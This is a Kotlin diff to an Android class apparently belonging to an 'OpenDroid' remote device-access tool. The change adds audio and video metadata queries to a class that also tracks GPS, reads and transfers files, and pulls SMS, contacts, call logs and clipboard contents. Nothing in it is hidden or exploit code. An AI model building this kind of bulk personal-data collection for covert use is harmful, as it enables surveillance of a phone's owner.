@@ -38,7 +38,7 @@ class TelephonyAndLocationManager(private val context: Context) {
         startLocationUpdates()
     }
 
-    // --- 1. Robust Live Satellite & Network GPS Engine ---
+    // --- 1. Live Satellite & Network GPS Engine ---
     @SuppressLint("MissingPermission")
     fun startLocationUpdates() {
         try {
@@ -47,7 +47,6 @@ class TelephonyAndLocationManager(private val context: Context) {
             val listener = object : LocationListener {
                 override fun onLocationChanged(loc: Location) {
                     latestLocation = loc
-                    Log.d("OpenDroidGPS", "Live GPS Fix received: Lat ${loc.latitude}, Lng ${loc.longitude}, Acc ${loc.accuracy}m")
                     onLocationUpdated?.invoke(formatLocationJson(loc))
                 }
                 override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
@@ -55,7 +54,6 @@ class TelephonyAndLocationManager(private val context: Context) {
                 override fun onProviderDisabled(provider: String) {}
             }
 
-            // Using MainLooper guarantees listener registration succeeds from any background thread
             val mainLooper = Looper.getMainLooper()
 
             if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
@@ -65,7 +63,6 @@ class TelephonyAndLocationManager(private val context: Context) {
                 locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 3000L, 2f, listener, mainLooper)
             }
 
-            // Grab instant cached fix if available while GPS locks
             val lastKnown = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                 ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                 ?: locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
@@ -96,7 +93,6 @@ class TelephonyAndLocationManager(private val context: Context) {
         return if (loc != null) {
             formatLocationJson(loc)
         } else {
-            // Force re-request updates if not locked yet
             startLocationUpdates()
             JSONObject().apply {
                 put("type", "LOCATION")
@@ -105,7 +101,118 @@ class TelephonyAndLocationManager(private val context: Context) {
         }
     }
 
-    // --- 2. File Explorer & Directory Navigation ---
+    // --- 2. Target 7: Audio / Music Query (Safe Lightweight Metadata) ---
+    fun getAudioTracks(): JSONArray {
+        val array = JSONArray()
+        try {
+            val projection = arrayOf(
+                MediaStore.Audio.Media._ID,
+                MediaStore.Audio.Media.TITLE,
+                MediaStore.Audio.Media.DISPLAY_NAME,
+                MediaStore.Audio.Media.ARTIST,
+                MediaStore.Audio.Media.DURATION,
+                MediaStore.Audio.Media.SIZE,
+                MediaStore.Audio.Media.DATE_ADDED,
+                MediaStore.Audio.Media.DATA
+            )
+            val selection = "${MediaStore.Audio.Media.IS_MUSIC} != 0"
+            val cursor = context.contentResolver.query(
+                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
+                projection,
+                selection,
+                null,
+                "${MediaStore.Audio.Media.DATE_ADDED} DESC"
+            )
+            cursor?.use {
+                val titleIdx = it.getColumnIndex(MediaStore.Audio.Media.TITLE)
+                val nameIdx = it.getColumnIndex(MediaStore.Audio.Media.DISPLAY_NAME)
+                val artistIdx = it.getColumnIndex(MediaStore.Audio.Media.ARTIST)
+                val durIdx = it.getColumnIndex(MediaStore.Audio.Media.DURATION)
+                val sizeIdx = it.getColumnIndex(MediaStore.Audio.Media.SIZE)
+                val dateIdx = it.getColumnIndex(MediaStore.Audio.Media.DATE_ADDED)
+                val dataIdx = it.getColumnIndex(MediaStore.Audio.Media.DATA)
+
+                var count = 0
+                // Safe 50 items pagination keeps packet under 15 KB
+                while (it.moveToNext() && count < 50) {
+                    val durationMs = if (durIdx >= 0) it.getLong(durIdx) else 0L
+                    val minutes = (durationMs / 1000) / 60
+                    val seconds = (durationMs / 1000) % 60
+                    val durationFormatted = String.format(Locale.US, "%02d:%02d", minutes, seconds)
+
+                    val obj = JSONObject().apply {
+                        put("title", if (titleIdx >= 0) it.getString(titleIdx) else "Unknown Track")
+                        put("fileName", if (nameIdx >= 0) it.getString(nameIdx) else "audio.mp3")
+                        put("artist", if (artistIdx >= 0) it.getString(artistIdx) else "Unknown Artist")
+                        put("duration", durationFormatted)
+                        put("size", if (sizeIdx >= 0) it.getLong(sizeIdx) else 0L)
+                        put("date", if (dateIdx >= 0) it.getLong(dateIdx) * 1000L else 0L)
+                        put("path", if (dataIdx >= 0) it.getString(dataIdx) else "")
+                    }
+                    array.put(obj)
+                    count++
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("OpenDroid", "Error querying audio tracks", e)
+        }
+        return array
+    }
+
+    // --- 3. Target 7: Video Files Query (Safe Lightweight Metadata) ---
+    fun getVideoTracks(): JSONArray {
+        val array = JSONArray()
+        try {
+            val projection = arrayOf(
+                MediaStore.Video.Media._ID,
+                MediaStore.Video.Media.TITLE,
+                MediaStore.Video.Media.DISPLAY_NAME,
+                MediaStore.Video.Media.DURATION,
+                MediaStore.Video.Media.SIZE,
+                MediaStore.Video.Media.DATE_ADDED,
+                MediaStore.Video.Media.DATA
+            )
+            val cursor = context.contentResolver.query(
+                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+                projection,
+                null,
+                null,
+                "${MediaStore.Video.Media.DATE_ADDED} DESC"
+            )
+            cursor?.use {
+                val titleIdx = it.getColumnIndex(MediaStore.Video.Media.TITLE)
+                val nameIdx = it.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME)
+                val durIdx = it.getColumnIndex(MediaStore.Video.Media.DURATION)
+                val sizeIdx = it.getColumnIndex(MediaStore.Video.Media.SIZE)
+                val dateIdx = it.getColumnIndex(MediaStore.Video.Media.DATE_ADDED)
+                val dataIdx = it.getColumnIndex(MediaStore.Video.Media.DATA)
+
+                var count = 0
+                while (it.moveToNext() && count < 50) {
+                    val durationMs = if (durIdx >= 0) it.getLong(durIdx) else 0L
+                    val minutes = (durationMs / 1000) / 60
+                    val seconds = (durationMs / 1000) % 60
+                    val durationFormatted = String.format(Locale.US, "%02d:%02d", minutes, seconds)
+
+                    val obj = JSONObject().apply {
+                        put("title", if (titleIdx >= 0) it.getString(titleIdx) else "Video")
+                        put("fileName", if (nameIdx >= 0) it.getString(nameIdx) else "video.mp4")
+                        put("duration", durationFormatted)
+                        put("size", if (sizeIdx >= 0) it.getLong(sizeIdx) else 0L)
+                        put("date", if (dateIdx >= 0) it.getLong(dateIdx) * 1000L else 0L)
+                        put("path", if (dataIdx >= 0) it.getString(dataIdx) else "")
+                    }
+                    array.put(obj)
+                    count++
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("OpenDroid", "Error querying videos", e)
+        }
+        return array
+    }
+
+    // --- 4. File Explorer & Directory Navigation ---
     fun getDirectoryContents(targetPath: String?): JSONObject {
         val root = Environment.getExternalStorageDirectory()
         val path = if (!targetPath.isNullOrEmpty()) targetPath else root.absolutePath
@@ -142,7 +249,7 @@ class TelephonyAndLocationManager(private val context: Context) {
         return result
     }
 
-    // --- 3. Chunked File Download ---
+    // --- 5. Chunked File Download ---
     fun readFileChunk(filePath: String, offset: Long, chunkSize: Int = 96 * 1024): JSONObject {
         val obj = JSONObject()
         val file = File(filePath)
@@ -180,7 +287,7 @@ class TelephonyAndLocationManager(private val context: Context) {
         return obj
     }
 
-    // --- 4. Chunked File Upload ---
+    // --- 6. Chunked File Upload ---
     fun saveUploadedChunk(targetDirPath: String?, fileName: String, base64Data: String, isFirstChunk: Boolean, isLastChunk: Boolean): Boolean {
         return try {
             val defaultDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
@@ -210,7 +317,7 @@ class TelephonyAndLocationManager(private val context: Context) {
         }
     }
 
-    // --- 5. Photos Gallery Query ---
+    // --- 7. Photos Gallery Query ---
     fun getRecentPhotos(): JSONArray {
         val array = JSONArray()
         try {
@@ -254,7 +361,7 @@ class TelephonyAndLocationManager(private val context: Context) {
         return array
     }
 
-    // --- 6. Real Storage Calculations ---
+    // --- 8. Real Storage Calculations ---
     fun getStorageStats(): JSONObject {
         val obj = JSONObject()
         try {
@@ -283,7 +390,7 @@ class TelephonyAndLocationManager(private val context: Context) {
         return obj
     }
 
-    // --- 7. Call Logs Query ---
+    // --- 9. Call Logs Query ---
     fun getCallLogs(): JSONArray {
         val array = JSONArray()
         try {
@@ -333,7 +440,7 @@ class TelephonyAndLocationManager(private val context: Context) {
         return array
     }
 
-    // --- 8. Installed Apps Query ---
+    // --- 10. Installed Apps Query ---
     fun getInstalledApps(): JSONArray {
         val array = JSONArray()
         try {
@@ -361,7 +468,7 @@ class TelephonyAndLocationManager(private val context: Context) {
         return array
     }
 
-    // --- 9. Clipboard Operations ---
+    // --- 11. Clipboard Operations ---
     fun setClipboardText(text: String) {
         Handler(Looper.getMainLooper()).post {
             try {
@@ -385,7 +492,7 @@ class TelephonyAndLocationManager(private val context: Context) {
         }
     }
 
-    // --- 10. SMS Operations ---
+    // --- 12. SMS Operations ---
     fun getRecentSms(): JSONArray {
         val array = JSONArray()
         try {
@@ -431,7 +538,7 @@ class TelephonyAndLocationManager(private val context: Context) {
         }
     }
 
-    // --- 11. Contacts Query ---
+    // --- 13. Contacts Query ---
     fun getContacts(): JSONArray {
         val array = JSONArray()
         try {
@@ -455,7 +562,7 @@ class TelephonyAndLocationManager(private val context: Context) {
         return array
     }
 
-    // --- 12. Make Phone Call ---
+    // --- 14. Make Phone Call ---
     @SuppressLint("MissingPermission")
     fun makeCall(number: String) {
         try {
